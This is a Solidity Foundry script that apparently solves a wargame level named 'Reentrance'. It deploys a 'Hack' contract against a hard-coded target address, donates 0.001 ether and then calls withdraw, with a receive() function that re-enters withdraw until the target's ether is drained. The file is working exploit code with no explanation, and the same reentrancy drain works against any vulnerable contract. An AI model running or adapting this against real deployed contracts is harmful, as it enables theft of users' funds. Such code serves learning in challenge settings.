// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface IReentrance {
  function donate(address _to) external payable;

  function balanceOf(address _who) external view returns (uint256);

  function withdraw(uint256 _amount) external;
}

contract Hack {
  address immutable target;

  constructor(address _target) {
    target = _target;
  }

  function donate() external payable {
    IReentrance c = IReentrance(target);
    c.donate{value: 0.001 ether}(address(this));
  }

  function hack() external {
    IReentrance(target).withdraw(0.001 ether);
  }

  receive() external payable {
    if (address(msg.sender).balance >= 0.001 ether) {
      IReentrance(msg.sender).withdraw(0.001 ether);
    }
  }
}

contract Solve is Script, Test {
  address target = address(0x046a24138b929A33a543dBcf156081622Ec283e4);
  IReentrance c = IReentrance(target);

  function run() public {
    vm.startBroadcast();

    console.log("Balance of contract is %s", target.balance);

    Hack h = new Hack(target);
    h.donate{value: 0.001 ether}();
    h.hack();

    console.log("Balance of contract is %s", target.balance);
    console.log("Balance of hack contract is %s", c.balanceOf(address(h)));

    vm.stopBroadcast();
  }
}
